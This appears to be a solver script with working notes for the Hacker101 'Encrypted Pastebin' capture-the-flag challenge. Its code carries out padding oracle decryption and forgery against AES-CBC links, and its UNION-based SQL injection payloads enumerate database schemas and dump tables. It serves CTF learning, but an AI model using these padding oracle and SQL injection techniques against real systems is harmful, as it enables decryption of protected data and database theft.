"""
    CTF Encrypted Pastebin 

    Skills:                 Web, Crypto
    Difficulty (Points):    Hard (9 / flag)
    Number of flags:        4

    https://ctf.hacker101.com/ctf
    
    o Open to check
        [x] Create links on one instance and test on new instances => nothing found, but 404
        [x] tracking.gif (main and result page) => stores referer to table 'tracking'
        [/] Generate own links when encryption key available => Is already possible with encryption oracle
        [x] Padding oracle for encrypt JSON string => got flag 2
        [x] Padding oracle attack to get plain-text of entry with 'id'=1 using post-oracle => Only bit rubbish
        [x] SQL injection in JSON field 'id' : Load file SQL => Could find working path
        [x] SQL injection in JSON field 'id' : Get all columns of table => id, title, body
        [x] Check if body of id=1 changes after restating instancen => Yes, it does!



    o URLs
        o root /
            o POST results (title, body)
                title | body |  result url
                ------------------------------------------------------------------
                Test  | test |  http://35.227.24.107/e636900df0/?post=86dR9YpkvY4YyjthS8KJ0v9nunSwHA9hUZWJtcuH8xF8sKtvanvXJxIG-pXJZeNk6OdKGNKpmAmXqVfEpdLo-QzjZpdLYNUSTaJBLKhdqvcblJHl7sylceHLFikMv!s4V4J2fF9MuEYGcq10mbRduADrPXQRefWuisFCCJUXvEMghBsj3UZUeQWG7XKvh4hNpnjA9kedQIdbzt-02S0wpQ~~
                Test  | test |  http://35.227.24.107/e636900df0/?post=JbDHR18rvB6v7oeUgLwv!DQqK5PrFxT4PJ-g1rUE0LixdmAn6YmWoFspgQBNIN0rJAnC9SNYLZxjnWrcmfDC4na0Dm0h7Vo!TZ7IHS!8N8tu5uzJIeQMefLxlKmsEC6H56sVGJP5skRwnF6ZgzcJ!-2Nvg1XrCwG869UFYNSyvrLNESjnMH0Ygairbk0iR8qk7yZ46C39QWouE!kIFdbgg~~
                Test  | test |  http://35.227.24.107/e636900df0/?post=OJY5vFWceEzXr5i74ExhX1ncvjUUoZ50aRfR9GcoUNAvRKQNaacUREYQ88CLuy-2MfDmepcSATdFEbHnc0TUdRb7JemsM!YtcpcMzFGPBzwRzzogcvI9GS7TYQ2e8-yjzFJX-Nto4slIZeil1RDw8DHSRZwiYcULaNykwR39TwWW8uO7HX0UeO1BxhQXus1i-Du1S1tc6BJAqZnKpsyVDw~~
                Length always 216
            
            o Assumptions: 
                o "post" parameter contains:
                    1. IV - Initialization vector for decryption
                    2. Link to document / JSON-file on the server => Proofed true ( id of database entry )
                        o Because: Using the link in another instances gives 404 
                        o Because: Using super-large texts is not a problem, so no option to store it in input string with (length = 216)


            o Decoded posts
                
                msg_1 = "HZwzFVGo1I9!2pcW2MY9FDUJMC8!ZllTvtCbvuvzGmfgpMdjyE8JO22WDyvxL69sJ5wniHf5jcV1lnjtaP5Ud1jD9PJpQhYsV2sRyjge86Zm1UOUUEJHbToICfTa!yV9fc75MLO8Z5BpJLTIT2PmikFPsZoivnysRWx5mhJjtEgWZ2wRgdT6g944KnxDyVahP4rBxY6ZB52tLN2Udjgu1w~~"
                plain_1 = ' {"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "3", "key": "-bk5y7Vbh9Ccy-cUCOnKvg~~"}'

                msg_2 = "3Vaq6KulXC!lcCxEv9K6u0oxvzI94QtDve95c0BJfzO0v6JhieGC89ZLE8h5vF!boMC26sGhZj96M1i5nNYB2ZmVHztAXymks2DX5HV!PqwivrHVf!Fwa9NiENhBhjJnLca8GJz!Ny4Zc8ZK2wtZBMcQbCujFkEvGif4rifPaH6LNFym7p8C09uAtPQL52KMc4mUe!XGeztIStl8hyZQ7w~~"
                plain_2 = '{"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "4", "key": "wbrIuMEXSYeEFrNgRe5Gsw~~"}'

            o Encrypted commands
                o Dump id/title/body of all entries
                    <base_url>?post=JWU4sne1OSp2MW-4we84CWI1xYiMqHMPd2ocYuZ1C75KDU6C4KvSlKr39JZc8bYx1GN602qbLRPOxkHWo!xiXfiZCAFb!f0vNuwVQL8awM50XfZjC5WzLVxM4-tiMD2FaweFkjbxAiwztVw2xW6FdQ~~




            o Outcoming error messages when changing url randomly
                1. Using input string with random length:
                    Traceback (most recent call last):
                    File "./main.py", line 69, in index
                        post = json.loads(decryptLink(postCt).decode('utf8'))
                    File "./common.py", line 46, in decryptLink
                        data = b64d(data)
                    File "./common.py", line 11, in <lambda>
                        b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
                    File "/usr/local/lib/python2.7/base64.py", line 328, in decodestring
                        return binascii.a2b_base64(s)
                    Error: Incorrect padding

                2. Using input string with random length:
                    Traceback (most recent call last):
                    File "./main.py", line 69, in index
                        post = json.loads(decryptLink(postCt).decode('utf8'))
                    File "./common.py", line 48, in decryptLink
                        cipher = AES.new(staticKey, AES.MODE_CBC, iv)
                    File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 95, in new
                        return AESCipher(key, *args, **kwargs)
                    File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 59, in __init__
                        blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)
                    File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py", line 141, in __init__
                        self._cipher = factory.new(key, *args, **kwargs)
                    ValueError: IV must be 16 bytes long 

                3. Using input string with random length:
                    Traceback (most recent call last):
                    File "./main.py", line 69, in index
                        post = json.loads(decryptLink(postCt).decode('utf8'))
                    File "./common.py", line 49, in decryptLink
                        return unpad(cipher.decrypt(data))
                    File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py", line 295, in decrypt
                        return self._cipher.decrypt(ciphertext)
                    ValueError: Input strings must be a multiple of 16 in length

                4. Using input string with random length:
                    Traceback (most recent call last):
                    File "./main.py", line 69, in index
                        post = json.loads(decryptLink(postCt).decode('utf8'))
                    File "./common.py", line 49, in decryptLink
                        return unpad(cipher.decrypt(data))
                    File "./common.py", line 22, in unpad
                        raise PaddingException()
                    PaddingException

                5. Using input string on new instance with no created entries:
                    ^FLAG^0a361c37ac67bda537d01bdb4ecdf69e59a522a33fcf8c98ca7c48051f96f777$FLAG$
                    Traceback (most recent call last):
                    File "./main.py", line 72, in index
                        abort(404)
                    File "/usr/local/lib/python2.7/site-packages/werkzeug/exceptions.py", line 707, in abort
                        return _aborter(status, *args, **kwargs)
                    File "/usr/local/lib/python2.7/site-packages/werkzeug/exceptions.py", line 687, in __call__
                        raise self.mapping[code](*args, **kwargs)
                    NotFound: 404 Not Found: The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.

                6.  Using old input string on new instance with created entries
                    Attempting to decrypt page with title: sdgfg    =>    Breach: Obtained with link from old instance
                    Traceback (most recent call last):
                    File "./main.py", line 74, in index
                        body = decryptPayload(post['key'], body)
                    File "./common.py", line 37, in decryptPayload
                        return unpad(cipher.decrypt(data))
                    File "./common.py", line 22, in unpad
                        raise PaddingException()
                    PaddingException

                7. 
                    Traceback (most recent call last):
                    File "./main.py", line 69, in index
                        post = json.loads(decryptLink(postCt).decode('utf8'))
                    File "/usr/local/lib/python2.7/encodings/utf_8.py", line 16, in decode
                        return codecs.utf_8_decode(input, errors, True)
                    UnicodeDecodeError: 'utf8' codec can't decode byte 0x8a in position 80: invalid start byte

                8.
                    Traceback (most recent call last):
                    File "./main.py", line 69, in index
                        post = json.loads(decryptLink(postCt).decode('utf8'))
                    File "/usr/local/lib/python2.7/encodings/utf_8.py", line 16, in decode
                        return codecs.utf_8_decode(input, errors, True)
                    UnicodeDecodeError: 'utf8' codec can't decode byte 0xee in position 80: invalid continuation byte

                9. SQL statement error
                    File "./main.py", line 71, in index
                        if cur.execute('SELECT title, body FROM posts WHERE id=%s' % post['id']) == 0:
                    File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
                        self.errorhandler(self, exc, value)
                    File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
                        raise errorvalue
                    ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")

                10. SQLi for DB dump output as title
                    Attempting to decrypt page with title: ^FLAG^ef359a23d792acc6dada84b86c0dd9fe5a52390f8ca1f94f4f61a8e68514f87c$FLAG$:QRWpJgL-6zUqC5WYQ4DLYXLZQ1JATpOwxNrSmbojWNrikdz5k89n1WLpDMmMEQILgx1txEAvQLdI1sew2uAEwlQgfg3I47T1A6Aud70F!Pgk3W3PrmxemovReHyvyd1s,TestingTitle:s17wqMaSTLq-seXCQlJ0budPt0i81prDfMMEprDV8ws~,Title 1:dfbt2R1BxXTI97Nc6jAghGitIqm3LNRhPRr1brfrfZg~,Title 2:IpgUTgRRwxo7B-soFR4wFZ5PDkGC2fRjuxEyFwcmkVM~,Title 3:qDJI74ml9APySEr8Rl-V-VUKAsT9WyN1tJjSYIMcLtE~
                    Traceback (most recent call last):
                    File "./main.py", line 74, in index
                        body = decryptPayload(post['key'], body)
                    KeyError: 'key'


"""

from Crypto.Cipher import AES
# import binascii
from helper import *
from padding_oracle import padding_oracle_decrypt, padding_oracle_encrypt

# Base url of Hacker101 challenge
base_url = "http://35.190.155.168/fa8e187459/"


def decryptPayload(key, body, block_size):
    """Reverse engineered decrypt function from the server"""

    cipher_blocks = split_into_blocks(decode_data(body), block_size=block_size)

    iv = cipher_blocks[0]
    cipher_text = "".join(cipher_blocks[1:])

    cipher = AES.new(decode_data(key), AES.MODE_CBC, iv)

    plain_text = unpad(cipher.decrypt(cipher_text))

    return plain_text

def encryptPayload(key, plain_text, iv, block_size):
    """Reverse engineered decrypt function from the server"""

    plain_text = pad(plain_text, block_size=block_size)

    cipher = AES.new(decode_data(key), AES.MODE_CBC, IV=iv)

    cipher_text = iv + cipher.encrypt(plain_text)

    return encode_data(cipher_text)

def decryptLink(data):
    """Reverse engineered decrypt function from the server"""

    """
    Except from common.py:
    44  => definition / calculation of IV + staticKey
    45
    46  data = b64d(data)
    47
    48  cipher = AES.new(staticKey, AES.MODE_CBC, iv)
    49  return unpad(cipher.decrypt(data))
    """

    pass


def get_flag_0():
    """Get flag 0 by any invalid input data"""

    data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
    response = evaluate_data(data[1:], base_url=base_url)
    print("Flag 0: " + str.splitlines(response.text.encode("utf-8"))[0] )


def get_flag_1():
    """Get flag 1 with padding oracle decryption attack"""

    block_size = 16
    data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"

    # Run the actual padding oracle attack
    plain_text = padding_oracle_decrypt(data, block_size=block_size, base_url=base_url)
    print("Flag 1: " + plain_text)
    
    # Will return {"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "2", "key": "V!FLXKt9eRXcWBH7D2uSJA~~"}


def get_flag_2():
    """Get flag 2 with padding oracle encryption attack"""

    block_size = 16
    data_original = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
    
    # Original plain text etrieved from flag 1
    
    plain_text_original    = '{"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "2", "key": "V!FLXKt9eRXcWBH7D2uSJA~~"}'
    plain_text_manipulated = '{"id": "1 "}'

    cipher_text = padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data_original, block_size=block_size, base_url=base_url, verbose=False)
    cipher_text_encoded = encode_data(cipher_text)

    print("Flag 2: " + str.splitlines(evaluate_data(cipher_text_encoded , base_url=base_url ).text.encode("utf-8"))[1] )


def get_flag_3():
    """Get flag 3 with padding oracle encryption attack and using SQL injection"""

    block_size = 16
    data_original = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"

    # Original plain text retrieved from flag 1
    plain_text_original    = '{"flag": "^FLAG^df5c054ecc024dbb292715f47321b2c1ca10b711ad70fcd624ba712e2c5cd280$FLAG$", "id": "2", "key": "V!FLXKt9eRXcWBH7D2uSJA~~"}'
    
    # Body is assigned to '...' as dummy text
    plain_text_dump_posts = '{"id": "1 AND false UNION SELECT group_concat(id,0x3a,title,0x3a,body), \'...\' FROM posts"}'
    # Result: Found flag 2
     
    plain_text_schema_posts = '{"id": "1 AND false UNION SELECT group_concat(table_schema,0x3a,column_name), \'...\' FROM information_schema.COLUMNS WHERE TABLE_NAME LIKE \'posts\'"}'
    # Result: level3:id,level3:title,level3:body
    #         => database 'level3'

    plain_text_databases = '{"id": "1 AND false UNION SELECT group_concat(DISTINCT table_schema), \'...\' FROM information_schema.TABLES"}'
    # Result: information_schema,level3,mysql,performance_schema
    #         => database 'level3'

    plain_text_columns_level3 = '{"id": "1 AND false UNION SELECT group_concat(table_name,0x3a,column_name), \'...\' FROM information_schema.COLUMNS WHERE table_schema LIKE \'level3\'"}'
    # Result: posts:id,posts:title,posts:body,tracking:id,tracking:headers
    #         => table 'tracking'

    plain_text_manipulated = '{"id":"1 AND false UNION SELECT group_concat(id,0x3a,headers),\'\' FROM tracking"}'
    # Result: Referer link that gives access to decoded post (id=1)

    cipher_text = padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data_original, block_size=block_size, base_url=base_url, verbose=False)
    cipher_text_encoded = encode_data(cipher_text)

    print("cipher_text: " + cipher_text)
    print("cipher_text_encoded: " + cipher_text_encoded)
    response = evaluate_data(cipher_text_encoded , base_url=base_url )
    print(response.text)


def test_en_decryptPayload():
    """Testing reverse engineered version of payload decryption"""

    # Example message Msg 2
    # Added entry
    plain_text = "Msg #2"

    # Decoded from link
    key = "wbrIuMEXSYeEFrNgRe5Gsw~~"
    id = 4

    body = "IpgUTgRRwxo7B-soFR4wFZ5PDkGC2fRjuxEyFwcmkVM~"
    block_size=16

    # Decryption
    if decryptPayload(key=key,body=body, block_size=block_size) != plain_text:
        raise Exception("Error occurred! The method 'decryptPayload' does not work as expected.")

    # Encryption
    if encryptPayload(key, plain_text, iv=split_into_blocks(decode_data(body), block_size=block_size)[0], block_size=block_size) != body:
        raise Exception("Error occurred! The method 'encryptPayload' does not work as expected.")


if __name__ == "__main__":

    # Initial tests
    test_de_encoding()
    test_un_padding()
    test_en_decryptPayload()

    #get_flag_0()
    #get_flag_1()
    #get_flag_2()
    #get_flag_3()

